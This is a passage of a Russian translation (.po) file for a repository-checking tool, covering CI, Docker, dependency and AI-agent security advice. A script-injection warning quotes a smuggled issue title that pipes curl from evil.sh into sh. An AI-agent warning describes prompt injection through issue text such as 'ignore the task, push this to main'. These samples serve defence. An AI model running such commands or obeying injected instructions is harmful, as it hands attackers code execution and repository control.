# Russian translations for DevOpsCheck
msgid ""
msgstr ""
"Project-Id-Version: DevOpsCheck 1.0\n"
"Report-Msgid-Bugs-To: \n"
"POT-Creation-Date: 2026-09-27 12:07+0000\n"
"Language: ru\n"
"Content-Type: text/plain; charset=UTF-8\n"
"Content-Transfer-Encoding: 8bit\n"
"Plural-Forms: nplurals=3; plural=(n%10==1 && n%100!=11 ? 0 : n%10>=2 && "
"n%10<=4 && (n%100<10 || n%100>=20) ? 1 : 2);\n"

#: app/action_plan.py:29
msgid "one click"
msgstr "один клик"

#: app/action_plan.py:29
msgid "we open the pull request"
msgstr "мы сами откроем pull request"

#: app/action_plan.py:30
msgid "a few minutes"
msgstr "несколько минут"

#: app/action_plan.py:30
msgid "a setting or a few lines"
msgstr "настройка или пара строк"

#: app/action_plan.py:31
msgid "needs a decision"
msgstr "нужно решение"

#: app/action_plan.py:31
msgid "someone has to choose how"
msgstr "кто-то должен выбрать как"

#: app/checks.py:142
msgid ".env is ignored by git"
msgstr "Файл .env исключён из git"

#: app/checks.py:143
msgid "A .env file holding secrets must never be committed to the repository."
msgstr "Файл .env с секретами не должен попадать в репозиторий."

#: app/checks.py:144 app/checks.py:150 app/checks.py:631
msgid "This project does not use a .env file."
msgstr "Проект не использует файл .env."

#: app/checks.py:146
msgid ""
"Add a `.env` line to .gitignore, then confirm the file is not already "
"tracked with `git ls-files .env`. If it is, remove it from history and "
"rotate every value in it."
msgstr ""
"Добавьте строку `.env` в .gitignore и проверьте, что файл ещё не "
"отслеживается: `git ls-files .env`. Если отслеживается — удалите его из "
"истории и смените все значения, которые в нём были."

#: app/checks.py:159
msgid "Automated dependency updates"
msgstr "Автообновление зависимостей"

#: app/checks.py:160
msgid ""
"Dependabot or Renovate opens pull requests as soon as a security patch is "
"released."
msgstr ""
"Dependabot или Renovate создаёт pull request сразу после выхода патча "
"безопасности."

#: app/checks.py:162
msgid ""
"Add renovate.json and enable Renovate for this project (the Mend Renovate "
"app on gitlab.com, or the renovate-runner pipeline on a self-managed "
"instance) so security patches arrive as merge requests instead of waiting "
"for someone to notice them. Dependabot does not run on GitLab."
msgstr ""
"Добавьте renovate.json и включите Renovate для проекта (приложение Mend "
"Renovate на gitlab.com или пайплайн renovate-runner на своём инстансе) — "
"тогда патчи безопасности будут приходить как merge request, а не ждать, пока "
"их кто-то заметит. Dependabot в GitLab не работает."

#: app/checks.py:166
msgid ""
"Add .github/dependabot.yml so security patches arrive as pull requests "
"instead of waiting for someone to notice them."
msgstr ""
"Создайте .github/dependabot.yml — патчи безопасности будут приходить как "
"pull request, а не ждать, пока кто-то их заметит."

#: app/checks.py:174
msgid "Security policy (SECURITY.md)"
msgstr "Security policy (SECURITY.md)"

#: app/checks.py:175
msgid ""
"Tells researchers how to report a vulnerability privately instead of opening "
"a public issue."
msgstr ""
"Объясняет исследователям, как сообщить об уязвимости приватно, а не через "
"публичный issue."

#: app/checks.py:177
msgid "Add SECURITY.md with a contact address and your expected response time."
msgstr ""
"Добавьте SECURITY.md с контактом и сроком ответа на сообщение об уязвимости."

#: app/checks.py:183
msgid "CODEOWNERS is configured"
msgstr "CODEOWNERS настроен"

#: app/checks.py:184
msgid ""
"CODEOWNERS automatically requests review from the right people on security-"
"critical paths."
msgstr ""
"CODEOWNERS автоматически назначает ревьюеров на критичные для безопасности "
"пути."

#: app/checks.py:186
msgid ""
"Create .gitlab/CODEOWNERS:\n"
"* @team-lead\n"
"/config/ @security-team\n"
"Then turn on \"Code owner approval\" for the protected branch."
msgstr ""
"Создайте .gitlab/CODEOWNERS:\n"
"* @team-lead\n"
"/config/ @security-team\n"
"Затем включите «Code owner approval» для защищённой ветки."

#: app/checks.py:188
msgid ""
"Create .github/CODEOWNERS:\n"
"* @team-lead\n"
"/config/ @security-team"
msgstr ""
"Создайте .github/CODEOWNERS:\n"
"* @team-lead\n"
"/config/ @security-team"

#: app/checks.py:211
msgid "CI/CD pipeline configured"
msgstr "Настроен CI/CD-пайплайн"

#: app/checks.py:212
#, python-format
msgid "Detected: %(tool)s."
msgstr "Обнаружено: %(tool)s."

#: app/checks.py:213
msgid ""
"No CI configuration found. Every deploy is a manual step that can be skipped "
"or done wrong."
msgstr ""
"Конфигурация CI не найдена. Каждый деплой — ручной шаг, который можно "
"пропустить или сделать неверно."

#: app/checks.py:215
msgid ""
"Add .gitlab-ci.yml that runs your tests and linter on every push and merge "
"request."
msgstr ""
"Добавьте .gitlab-ci.yml, который запускает тесты и линтер на каждый push и "
"merge request."

#: app/checks.py:217
msgid ""
"Add .github/workflows/ci.yml (or .gitlab-ci.yml) that runs your tests and "
"linter on every push."
msgstr ""
"Добавьте .github/workflows/ci.yml (или .gitlab-ci.yml), который запускает "
"тесты и линтер на каждый push."

#: app/checks.py:272
msgid "Tests run in CI"
msgstr "Тесты запускаются в CI"

#: app/checks.py:273
msgid ""
"Running the test suite on every commit is what stops a regression from "
"reaching production."
msgstr ""
"Запуск тестов на каждый коммит — то, что не даёт регрессии дойти до "
"продакшена."

#: app/checks.py:275
msgid ""
"Add a test step to the pipeline (pytest, jest, go test — whatever your stack "
"uses)."
msgstr ""
"Добавьте в пайплайн шаг запуска тестов (pytest, jest, go test — что "
"используется в вашем стеке)."

#: app/checks.py:276
msgid "Matched by workflow or job name."
msgstr "Найдено по имени workflow или job."

#: app/checks.py:277
#, python-format
msgid ""
"Checked %(n)d CI file(s) and what they call (%(followed)s) — no test command "
"found."
msgstr ""
"Проверено CI-файлов: %(n)d и то, что они вызывают (%(followed)s), — команды "
"запуска тестов не найдено."

#: app/checks.py:279
msgid "No CI configuration found."
msgstr "Конфигурация CI не найдена."

#: app/checks.py:284
msgid "Default branch is protected"
msgstr "Основная ветка защищена"

#: app/checks.py:285
#, python-format
msgid ""
"Branch protection stops anyone pushing straight to %(branch)s without review."
msgstr "Branch protection не даёт пушить напрямую в %(branch)s без ревью."

#: app/checks.py:288
#, python-format
msgid ""
"Protect %(branch)s in Settings → Repository → Protected branches: \"Allowed "
"to push\" No one, merges through a merge request with at least one approval."
msgstr ""
"Защитите %(branch)s в Settings → Repository → Protected branches: «Allowed "
"to push» — No one, изменения только через merge request с минимум одним "
"одобрением."

#: app/checks.py:291
#, python-format
msgid ""
"Turn on branch protection for %(branch)s: require a pull request and at "
"least one approval before merging."
msgstr ""
"Включите защиту ветки %(branch)s: требовать pull request и хотя бы одно "
"одобрение перед слиянием."

#: app/checks.py:295
#, python-format
msgid ""
"The provider did not say whether %(branch)s is protected — reading "
"protection rules needs a token with admin rights on the repository."
msgstr ""
"Провайдер не сообщил, защищена ли ветка %(branch)s: чтобы прочитать правила "
"защиты, нужен токен с правами администратора репозитория."

#: app/checks.py:302
msgid "Linter or formatter configured"
msgstr "Настроен линтер или форматтер"

#: app/checks.py:303
msgid "A single enforced code style removes a whole class of review comments."
msgstr ""
"Единый принудительный стиль кода убирает целый класс комментариев на ревью."

#: app/checks.py:305
msgid ""
"Add a linter config: ruff.toml or pyproject.toml for Python, "
"eslint.config.js for JavaScript, .golangci.yml for Go."
msgstr ""
"Добавьте конфиг линтера: ruff.toml или pyproject.toml для Python, "
"eslint.config.js для JavaScript, .golangci.yml для Go."

#: app/checks.py:321
msgid "Security scanning in the pipeline"
msgstr "Сканирование безопасности в пайплайне"

#: app/checks.py:322
msgid ""
"A scanner in CI catches vulnerable dependencies and leaked secrets before "
"they merge."
msgstr "Сканер в CI ловит уязвимые зависимости и утёкшие секреты до слияния."

#: app/checks.py:324
msgid ""
"Add a scanning step to CI. Free options: Trivy for images and dependencies, "
"gitleaks for secrets, CodeQL for code. Each is a single job in your existing "
"workflow."
msgstr ""
"Добавьте шаг сканирования в CI. Бесплатные варианты: Trivy для образов и "
"зависимостей, gitleaks для секретов, CodeQL для кода. Каждый — одна job в "
"существующем workflow."

#: app/checks.py:356
msgid "Dockerfile present"
msgstr "Dockerfile присутствует"

#: app/checks.py:357
msgid ""
"A Dockerfile gives everyone — and production — the same reproducible runtime."
msgstr ""
"Dockerfile даёт всем — и продакшену — одинаковое воспроизводимое окружение."

#: app/checks.py:359
msgid ""
"Add a Dockerfile at the repository root. Use a multi-stage build to keep the "
"final image small."
msgstr ""
"Создайте Dockerfile в корне репозитория. Используйте multi-stage сборку, "
"чтобы финальный образ был небольшим."

#: app/checks.py:364
msgid ""
"Searched the whole tree for Dockerfile, Dockerfile.* and *.Dockerfile "
"(outside tests and examples) — none found."
msgstr ""
"Искали по всему дереву Dockerfile, Dockerfile.* и *.Dockerfile (кроме тестов "
"и примеров) — ничего не найдено."

#: app/checks.py:372
msgid ".dockerignore configured"
msgstr ".dockerignore настроен"

#: app/checks.py:373
msgid ""
".dockerignore keeps .git, node_modules and secrets out of the build context."
msgstr ""
".dockerignore не пускает .git, node_modules и секреты в контекст сборки."

#: app/checks.py:375
msgid ""
"Create .dockerignore with at least: .git, node_modules, __pycache__, .env, "
"*.log"
msgstr ""
"Создайте .dockerignore как минимум с: .git, node_modules, __pycache__, .env, "
"*.log"

#: app/checks.py:378
msgid "No Dockerfile, so there is no build context to trim."
msgstr "Dockerfile отсутствует — сокращать контекст сборки нечего."

#: app/checks.py:384
msgid "Healthcheck defined"
msgstr "Healthcheck задан"

#: app/checks.py:385
msgid ""
"Without a healthcheck the orchestrator cannot tell a starting container from "
"a broken one."
msgstr ""
"Без healthcheck оркестратор не отличает запускающийся контейнер от "
"сломанного."

#: app/checks.py:387
msgid ""
"Add to docker-compose.yml:\n"
"healthcheck:\n"
"  test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8000/health/\"]\n"
"  interval: 30s\n"
"  timeout: 10s\n"
"  retries: 3"
msgstr ""
"Добавьте в docker-compose.yml:\n"
"healthcheck:\n"
"  test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8000/health/\"]\n"
"  interval: 30s\n"
"  timeout: 10s\n"
"  retries: 3"

#: app/checks.py:391
msgid "No Dockerfile or compose file to define a healthcheck in."
msgstr "Нет ни Dockerfile, ни compose-файла, где можно объявить healthcheck."

#: app/checks.py:402
msgid "Container runs as a non-root user"
msgstr "Контейнер работает не от root"

#: app/checks.py:403
msgid "A container running as root turns a process escape into host access."
msgstr "Контейнер от root превращает побег из процесса в доступ к хосту."

#: app/checks.py:405
msgid ""
"Add to the Dockerfile:\n"
"RUN addgroup -S app && adduser -S app -G app\n"
"USER app"
msgstr ""
"Добавьте в Dockerfile:\n"
"RUN addgroup -S app && adduser -S app -G app\n"
"USER app"

#: app/checks.py:408
msgid "No Dockerfile, so there is no container user to set."
msgstr "Dockerfile отсутствует — задавать пользователя контейнера негде."

#: app/checks.py:410
#, python-format
msgid "Runs as root: %(files)s"
msgstr "Работает от root: %(files)s"

#: app/checks.py:411
#, python-format
msgid "USER set to a non-root user in: %(files)s"
msgstr "USER задан непривилегированным пользователем в: %(files)s"

#: app/checks.py:433
msgid "Base image is pinned (not :latest)"
msgstr "Базовый образ закреплён (не :latest)"

#: app/checks.py:434
#, python-format
msgid ""
"FROM %(image)s resolves to something different on every build — including in "
"production."
msgstr ""
"FROM %(image)s на каждой сборке разрешается в другой образ — в том числе в "
"продакшене."

#: app/checks.py:436
msgid "Base images are pinned to explicit tags."
msgstr "Базовые образы закреплены явными тегами."

#: app/checks.py:438
msgid ""
"Replace floating tags with explicit ones, for example FROM python:3.11-slim "
"or FROM node:20-alpine. Pin by digest for the strongest guarantee."
msgstr ""
"Замените плавающие теги на явные, например FROM python:3.11-slim или FROM "
"node:20-alpine. Закрепление по digest даёт максимальную гарантию."

#: app/checks.py:442
msgid "No Dockerfile, so there is no base image to pin."
msgstr "Dockerfile отсутствует — закреплять базовый образ негде."

#: app/checks.py:454
msgid "Dockerfile uses a multi-stage build"
msgstr "Dockerfile использует multi-stage сборку"

#: app/checks.py:455
msgid ""
"A multi-stage build leaves compilers and build tools out of the shipped "
"image."
msgstr ""
"Multi-stage сборка оставляет компиляторы и сборочные инструменты вне "
"итогового образа."

#: app/checks.py:457
msgid ""
"Split the build:\n"
"FROM python:3.11 AS builder\n"
"RUN pip install --prefix=/install -r requirements.txt\n"
"FROM python:3.11-slim\n"
"COPY --from=builder /install /usr/local"
msgstr ""
"Разделите сборку:\n"
"FROM python:3.11 AS builder\n"
"RUN pip install --prefix=/install -r requirements.txt\n"
"FROM python:3.11-slim\n"
"COPY --from=builder /install /usr/local"

#: app/checks.py:461
msgid "No Dockerfile to build in stages."
msgstr "Нет Dockerfile, который можно разбить на стадии."

#: app/checks.py:470
msgid "Resource limits set in compose"
msgstr "Лимиты ресурсов заданы в compose"

#: app/checks.py:471
msgid ""
"Without memory limits one runaway container can take the whole host down "
"with it."
msgstr ""
"Без лимитов памяти один вышедший из-под контроля контейнер уронит весь хост."

#: app/checks.py:473
msgid ""
"Add to each service:\n"
"deploy:\n"
"  resources:\n"
"    limits:\n"
"      memory: 512M\n"
"      cpus: \"0.5\""
msgstr ""
"Добавьте в каждый сервис:\n"
"deploy:\n"
"  resources:\n"
"    limits:\n"
"      memory: 512M\n"
"      cpus: \"0.5\""

#: app/checks.py:476
msgid "No compose file to set resource limits in."
msgstr "Нет compose-файла, где можно задать лимиты ресурсов."

#: app/checks.py:489
msgid "README exists"
msgstr "README существует"

#: app/checks.py:490
msgid "The README is the first thing anyone opening the repository reads."
msgstr "README — первое, что читает любой, кто открыл репозиторий."

#: app/checks.py:492
msgid ""
"Add README.md covering what the project does, how to run it locally, and how "
"to run the tests."
msgstr ""
"Добавьте README.md: что делает проект, как запустить локально и как прогнать "
"тесты."

#: app/checks.py:506
msgid "README explains how to run the project"
msgstr "README объясняет, как запустить проект"

#: app/checks.py:507
msgid ""
"A README without setup instructions costs every new developer their first "
"day."
msgstr ""
"README без инструкции по запуску стоит каждому новому разработчику первого "
"рабочего дня."

#: app/checks.py:509
msgid ""
"Expand the README with a Getting started section: prerequisites, install "
"command, how to run the app, how to run the tests."
msgstr ""
"Дополните README разделом «Быстрый старт»: требования, команда установки, "
"запуск приложения, запуск тестов."

#: app/checks.py:517
msgid "CHANGELOG maintained"
msgstr "CHANGELOG ведётся"

#: app/checks.py:518
msgid ""
"A changelog tells users and your own team what actually changed between "
"releases."
msgstr ""
"Changelog говорит пользователям и вашей же команде, что реально изменилось "
"между релизами."

#: app/checks.py:520
msgid "Add CHANGELOG.md and follow the keepachangelog.com format."
msgstr "Добавьте CHANGELOG.md в формате keepachangelog.com."

#: app/checks.py:522
msgid ""
"Looked for CHANGELOG, CHANGES, HISTORY, NEWS, RELEASES and release notes "
"(any case and extension) in the root, .github/ and docs/, and for changelog "
"tooling — none found."
msgstr ""
"Искали CHANGELOG, CHANGES, HISTORY, NEWS, RELEASES и release notes (любой "
"регистр и расширение) в корне, .github/ и docs/, а также инструменты "
"changelog — ничего не найдено."

#: app/checks.py:528
msgid "CONTRIBUTING guide"
msgstr "Гайд CONTRIBUTING"

#: app/checks.py:529
msgid ""
"A contribution guide lowers the barrier for the next person who wants to "
"help."
msgstr ""
"Гайд для контрибьюторов снижает барьер для следующего, кто захочет помочь."

#: app/checks.py:531
msgid ""
"Add CONTRIBUTING.md describing the flow: fork, branch, merge request, review."
msgstr ""
"Добавьте CONTRIBUTING.md с описанием процесса: форк, ветка, merge request, "
"ревью."

#: app/checks.py:533
msgid ""
"Add CONTRIBUTING.md describing the flow: fork, branch, pull request, review."
msgstr ""
"Добавьте CONTRIBUTING.md с описанием процесса: форк, ветка, pull request, "
"ревью."

#: app/checks.py:545
msgid "Pull request / issue templates"
msgstr "Шаблоны pull request и issue"

#: app/checks.py:546
msgid ""
"Templates make sure every PR and bug report arrives with the context "
"reviewers need."
msgstr ""
"Шаблоны гарантируют, что каждый PR и баг-репорт приходит с контекстом, "
"нужным ревьюеру."

#: app/checks.py:548
msgid ""
"Add .gitlab/merge_request_templates/Default.md and .gitlab/issue_templates/"
"Bug.md."
msgstr ""
"Добавьте .gitlab/merge_request_templates/Default.md и .gitlab/"
"issue_templates/Bug.md."

#: app/checks.py:550
msgid ""
"Add .github/pull_request_template.md and .github/ISSUE_TEMPLATE/"
"bug_report.md."
msgstr ""
"Добавьте .github/pull_request_template.md и .github/ISSUE_TEMPLATE/"
"bug_report.md."

#: app/checks.py:562
msgid "Dependency manifest present"
msgstr "Файл зависимостей присутствует"

#: app/checks.py:563
msgid ""
"Without a manifest the environment cannot be reproduced or scanned for "
"vulnerabilities."
msgstr ""
"Без файла зависимостей окружение нельзя воспроизвести и нельзя "
"просканировать на уязвимости."

#: app/checks.py:565
msgid ""
"Add a dependency file: requirements.txt or pyproject.toml (Python), "
"package.json (Node), go.mod (Go), Cargo.toml (Rust)."
msgstr ""
"Добавьте файл зависимостей: requirements.txt или pyproject.toml (Python), "
"package.json (Node), go.mod (Go), Cargo.toml (Rust)."

#: app/checks.py:568 app/checks.py:642
#, python-format
msgid "Looked in: %(paths)s — none found."
msgstr "Искали в: %(paths)s — ничего не найдено."

#: app/checks.py:573
msgid "Lock file present"
msgstr "Lock-файл присутствует"

#: app/checks.py:574
msgid ""
"A lock file pins exact versions so the build you tested is the build you "
"ship."
msgstr ""
"Lock-файл фиксирует точные версии: вы выкатываете ровно ту сборку, которую "
"тестировали."

#: app/checks.py:576
msgid ""
"Generate a lock file: `pip freeze > requirements.lock`, `npm install`, "
"`poetry lock`, `go mod tidy` or `cargo build` depending on your stack."
msgstr ""
"Сгенерируйте lock-файл: `pip freeze > requirements.lock`, `npm install`, "
"`poetry lock`, `go mod tidy` или `cargo build` — в зависимости от стека."

#: app/checks.py:580
msgid "No dependency manifest, so there is nothing to lock."
msgstr "Нет файла зависимостей — фиксировать версии нечего."

#: app/checks.py:593
msgid "Dependencies pinned to exact versions"
msgstr "Зависимости закреплены точными версиями"

#: app/checks.py:594
msgid ""
"Ranges such as >= mean two builds of the same commit can install different "
"code."
msgstr ""
"Диапазоны вида >= означают, что две сборки одного коммита поставят разный "
"код."

#: app/checks.py:596
msgid ""
"Run `pip freeze > requirements.txt` to pin exact versions, and let Renovate "
"raise them."
msgstr ""
"Выполните `pip freeze > requirements.txt`, чтобы закрепить точные версии, а "
"поднимать их доверьте Renovate."

#: app/checks.py:598
msgid ""
"Run `pip freeze > requirements.txt` to pin exact versions, and let "
"Dependabot raise them."
msgstr ""
"Выполните `pip freeze > requirements.txt`, чтобы закрепить точные версии, а "
"поднимать их доверьте Dependabot."

#: app/checks.py:601
msgid "No requirements.txt to check for exact versions."
msgstr "Нет requirements.txt — проверять закреплённость версий не в чем."

#: app/checks.py:615
msgid ".gitignore configured"
msgstr ".gitignore настроен"

#: app/checks.py:616
msgid ""
"Without .gitignore, build output and local secrets end up committed sooner "
"or later."
msgstr ""
"Без .gitignore артефакты сборки и локальные секреты рано или поздно попадут "
"в коммит."

#: app/checks.py:618
msgid ""
"Add a .gitignore for your stack — gitignore.io generates one from a language "
"list."
msgstr ""
"Добавьте .gitignore под ваш стек — gitignore.io сгенерирует его по списку "
"языков."

#: app/checks.py:625
msgid ".env.example documents required variables"
msgstr ".env.example документирует нужные переменные"

#: app/checks.py:626
msgid ""
"When .env is ignored and undocumented, nobody new can start the project."
msgstr ""
"Когда .env скрыт и не задокументирован, новый разработчик не может запустить "
"проект."

#: app/checks.py:628
msgid ""
"Add .env.example listing every variable the app reads, with placeholder "
"values."
msgstr ""
"Добавьте .env.example со всеми переменными, которые читает приложение, и "
"значениями-заглушками."

#: app/checks.py:638
msgid "License specified"
msgstr "Лицензия указана"

#: app/checks.py:639
msgid "Without a license, nobody else has legal permission to use the code."
msgstr "Без лицензии ни у кого нет юридического права использовать этот код."

#: app/checks.py:641
msgid ""
"Add a LICENSE file — MIT or Apache 2.0 for open source, or a proprietary "
"notice for closed code."
msgstr ""
"Добавьте файл LICENSE — MIT или Apache 2.0 для открытого кода, либо "
"проприетарную оговорку для закрытого."

#: app/checks.py:653
msgid "Repository is actively maintained"
msgstr "Репозиторий активно поддерживается"

#: app/checks.py:654
#, python-format
msgid "Last commit was %(days)d days ago."
msgstr "Последний коммит был %(days)d дней назад."

#: app/checks.py:655
msgid "Last commit is recent."
msgstr "Последний коммит свежий."

#: app/checks.py:657
msgid ""
"Either bring the project up to date or archive it so nobody depends on it by "
"mistake."
msgstr ""
"Либо приведите проект в актуальное состояние, либо заархивируйте, чтобы на "
"него не полагались по ошибке."

#: app/checks_ai_agents.py:260
msgid "No credentials in MCP server configs"
msgstr "Нет учётных данных в конфигах MCP-серверов"

#: app/checks_ai_agents.py:263
#, python-format
msgid ""
"A credential is typed into an MCP config that is committed to the "
"repository: %(where)s. Everyone who can read the repository — and every tool "
"that indexes it — has that token."
msgstr ""
"В конфиг MCP, закоммиченный в репозиторий, вписан секрет: %(where)s. Этот "
"токен есть у каждого, кто может читать репозиторий, — и у каждого "
"инструмента, который его индексирует."

#: app/checks_ai_agents.py:266
msgid ""
"MCP configs reference credentials from the environment instead of containing "
"them."
msgstr ""
"Конфиги MCP берут учётные данные из переменных окружения, а не хранят их."

#: app/checks_ai_agents.py:269
msgid ""
"Rotate the token first — it is already exposed. Then reference it instead of "
"writing it:"
msgstr ""
"Сначала перевыпустите токен — он уже раскрыт. Затем ссылайтесь на него, а не "
"вписывайте значение:"

#: app/checks_ai_agents.py:273
msgid ""
"Keep per-person configs out of git (add them to .gitignore) and commit an "
"example file without values."
msgstr ""
"Личные конфиги не храните в git (добавьте в .gitignore), а в репозиторий "
"положите пример без значений."

#: app/checks_ai_agents.py:277
msgid "MCP servers run a pinned version"
msgstr "MCP-серверы запускаются в закреплённой версии"

#: app/checks_ai_agents.py:280
#, python-format
msgid ""
"%(where)s starts an MCP server with no fixed version, so every editor start "
"downloads whatever was published last — with your credentials in its "
"environment."
msgstr ""
"%(where)s запускает MCP-сервер без фиксированной версии: при каждом старте "
"редактора скачивается то, что опубликовано последним, — и получает ваши "
"учётные данные в окружении."

#: app/checks_ai_agents.py:283
msgid "Every locally started MCP server names an exact version."
msgstr "Каждый локально запускаемый MCP-сервер указан с точной версией."

#: app/checks_ai_agents.py:285
msgid "Name the exact version:"
msgstr "Укажите точную версию:"

#: app/checks_ai_agents.py:289
msgid ""
"Renovate and Dependabot do not see these files; review the versions when you "
"review other dependencies."
msgstr ""
"Renovate и Dependabot эти файлы не видят — проверяйте версии вместе с "
"остальными зависимостями."

#: app/checks_ai_agents.py:293 app/checks_ai_agents.py:294
msgid "The repository has no MCP server configs."
msgstr "В репозитории нет конфигов MCP-серверов."

#: app/checks_ai_agents.py:296
msgid ""
"No MCP server here is downloaded by a package runner (npx, uvx, docker run); "
"there is no version to pin."
msgstr ""
"Ни один MCP-сервер здесь не скачивается через npx, uvx или docker run — "
"закреплять нечего."

#: app/checks_ai_agents.py:360
msgid "agent CLI in run:"
msgstr "CLI агента в run:"

#: app/checks_ai_agents.py:374
#, python-format
msgid ""
"An AI agent that can change code runs on an event anyone can cause: "
"%(where)s. Whoever writes the issue or comment writes the agent's "
"instructions — \"ignore the task, push this to main\" is a prompt, not an "
"exploit."
msgstr ""
"AI-агент, способный менять код, запускается по событию, которое может "
"вызвать кто угодно: %(where)s. Кто пишет issue или комментарий, тот пишет "
"агенту инструкции — «забудь задачу, запушь это в main» это промпт, а не "
"эксплойт."

#: app/checks_ai_agents.py:382
#, python-format
msgid ""
"An AI agent runs on an event anyone can cause and can post comments or "
"labels, though not change code: %(where)s. The worst an instruction hidden "
"in an issue can do is make it say or label the wrong thing — keep its tools "
"that narrow."
msgstr ""
"AI-агент запускается по событию, которое может вызвать кто угодно, и может "
"писать комментарии или ставить метки, но не менять код: %(where)s. Худшее, "
"чего добьётся спрятанная в issue инструкция, — неверный комментарий или "
"метка. Держите его инструменты такими же узкими."

#: app/checks_ai_agents.py:388
msgid "AI agents in CI cannot be steered by outsiders"
msgstr "Посторонние не могут управлять AI-агентами в CI"

#: app/checks_ai_agents.py:393
msgid ""
"Every AI agent in CI either runs on events only collaborators can cause, "
"checks who triggered it, or cannot write."
msgstr ""
"Каждый AI-агент в CI либо запускается только событиями участников проекта, "
"либо проверяет, кто его вызвал, либо не имеет права записи."

#: app/checks_ai_agents.py:396
msgid "Pick at least one, ideally all three:"
msgstr "Выберите хотя бы одно, а лучше все три:"

#: app/checks_ai_agents.py:397
msgid "1. Only react to collaborators:"
msgstr "1. Реагировать только на участников проекта:"

#: app/checks_ai_agents.py:400
msgid ""
"2. Give the job the least it needs — often read access and pull-requests: "
"write, never contents: write on untrusted input."
msgstr ""
"2. Дайте job минимум прав — обычно чтение и pull-requests: write, но никогда "
"contents: write при недоверенном вводе."

#: app/checks_ai_agents.py:402
msgid ""
"3. Keep the agent's tool allow-list short (no shell, no git push) when the "
"prompt can contain outside text."
msgstr ""
"3. Держите список разрешённых агенту инструментов коротким (без shell и git "
"push), если в промпт может попасть посторонний текст."

#: app/checks_ai_agents.py:406
msgid "No workflow runs an AI agent."
msgstr "Ни один workflow не запускает AI-агента."

#: app/checks_ai_agents.py:434
msgid "Agent instruction files hold no secrets or internal addresses"
msgstr "В инструкциях для агентов нет секретов и внутренних адресов"

#: app/checks_ai_agents.py:439
#, python-format
msgid ""
"Files every AI agent reads first contain %(what)s. They are read by every "
"tool and model the team uses, and often end up in prompts sent to a provider."
msgstr ""
"Файлы, которые каждый AI-агент читает первыми, содержат: %(what)s. Их читают "
"все инструменты и модели команды, и они часто попадают в промпты, уходящие "
"провайдеру."

#: app/checks_ai_agents.py:443
msgid ""
"CLAUDE.md, AGENTS.md and similar files contain no credentials or internal "
"hostnames."
msgstr ""
"В CLAUDE.md, AGENTS.md и похожих файлах нет учётных данных и внутренних "
"адресов."

#: app/checks_ai_agents.py:445
msgid ""
"Remove the values and rotate any credential. Describe where things are "
"instead of what they are: \"the staging database URL is in 1Password → "
"Staging\", not the URL. Keep personal notes in CLAUDE.local.md and add it "
"to .gitignore."
msgstr ""
"Удалите значения и перевыпустите учётные данные. Пишите, где что лежит, а не "
"что это: «адрес базы staging — в 1Password → Staging», а не сам адрес. "
"Личные заметки держите в CLAUDE.local.md и добавьте его в .gitignore."

#: app/checks_ai_agents.py:450
msgid "The repository has no agent instruction files."
msgstr "В репозитории нет файлов инструкций для агентов."

#: app/checks_ai_agents.py:458 app/checks_cicd.py:78
#, python-format
msgid "and %(n)d more"
msgstr "и ещё %(n)d"

#: app/checks_cicd.py:246
msgid "GitHub Actions pinned to a commit SHA"
msgstr "GitHub Actions закреплены по SHA коммита"

#: app/checks_cicd.py:247
#, python-format
msgid ""
"%(n)d action(s) are referenced by a moving tag, for example %(sample)s. A "
"tag can be repointed at malicious code without any change on your side."
msgstr ""
"%(n)d action(s) подключены по плавающему тегу, например %(sample)s. Тег "
"могут перенаправить на вредоносный код без единого изменения с вашей стороны."

#: app/checks_cicd.py:250
msgid "Every third-party action is pinned to a commit SHA."
msgstr "Все сторонние actions закреплены по SHA коммита."

#: app/checks_cicd.py:251
msgid "Reference actions by full commit SHA:"
msgstr "Подключайте actions по полному SHA коммита:"

#: app/checks_cicd.py:253
msgid ""
"Tools such as pin-github-action or Dependabot can do this and keep it "
"updated."
msgstr ""
"Это умеют pin-github-action и Dependabot — они же будут поддерживать "
"закрепление в актуальном состоянии."

#: app/checks_cicd.py:257
msgid "No script injection in workflows"
msgstr "Нет инъекций в скрипты workflow"

#: app/checks_cicd.py:258
#, python-format
msgid ""
"Text an outsider controls — an issue or pull request title, a branch name, a "
"comment — is pasted straight into a shell script: %(where)s. A title such as "
"\"a\"; curl evil.sh | sh; echo \" runs as code, with the job's token and "
"secrets."
msgstr ""
"Текст, который контролирует посторонний человек — заголовок issue или pull "
"request, имя ветки, комментарий, — подставляется прямо в shell-скрипт: "
"%(where)s. Заголовок вида \"a\"; curl evil.sh | sh; echo \" выполнится как "
"код — с токеном и секретами job."

#: app/checks_cicd.py:263
msgid ""
"No workflow pastes an issue, pull request, comment or branch name into a "
"script."
msgstr ""
"Ни один workflow не подставляет в скрипт заголовки issue и pull request, "
"комментарии или имена веток."

#: app/checks_cicd.py:264
msgid ""
"Pass the value through an environment variable, which the shell treats as "
"data:"
msgstr ""
"Передавайте значение через переменную окружения — shell воспринимает её как "
"данные:"

#: app/checks_cicd.py:268
msgid ""
"Never write ${{ … }} with untrusted input inside run: or a github-script "
"script."
msgstr ""
"Никогда не пишите ${{ … }} с недоверенными данными внутри run: или скрипта "
"github-script."

#: app/checks_cicd.py:272
msgid "No unsafe pull_request_target workflow"
msgstr "Нет небезопасного pull_request_target"

#: app/checks_cicd.py:273
#, python-format
msgid ""
"A workflow that runs with your secrets checks out code from the pull "
"request: %(where)s. Anyone who opens a pull request can run code with access "
"to those secrets and a write token."
msgstr ""
"Workflow, у которого есть доступ к вашим секретам, забирает код из pull "
"request: %(where)s. Любой, кто откроет pull request, сможет выполнить код с "
"доступом к этим секретам и токеном на запись."

#: app/checks_cicd.py:277
msgid ""
"No pull_request_target or workflow_run workflow checks out pull request code."
msgstr ""
"Ни один workflow на pull_request_target или workflow_run не забирает код из "
"pull request."

#: app/checks_cicd.py:278
msgid ""
"Never check out PR code inside pull_request_target. Split the workflow in "
"two:\n"
"  1. Untrusted (on: pull_request) — reads the code, has no secrets.\n"
"  2. Trusted (on: workflow_run) — has secrets, never checks out PR code."
msgstr ""
"Никогда не делайте checkout кода PR внутри pull_request_target. Разделите "
"workflow на два:\n"
"  1. Недоверенный (on: pull_request) — читает код, не имеет секретов.\n"
"  2. Доверенный (on: workflow_run) — имеет секреты, но не читает код PR."

#: app/checks_cicd.py:285
#, python-format
msgid ""
"%(where)s grants write-all: every scope of the job token, to every step, "
"including third-party actions."
msgstr ""
"%(where)s выдаёт write-all: все права токена job — каждому шагу, включая "
"сторонние actions."

#: app/checks_cicd.py:288
#, python-format
msgid ""
"%(where)s declares no permissions, so the job token gets the repository "
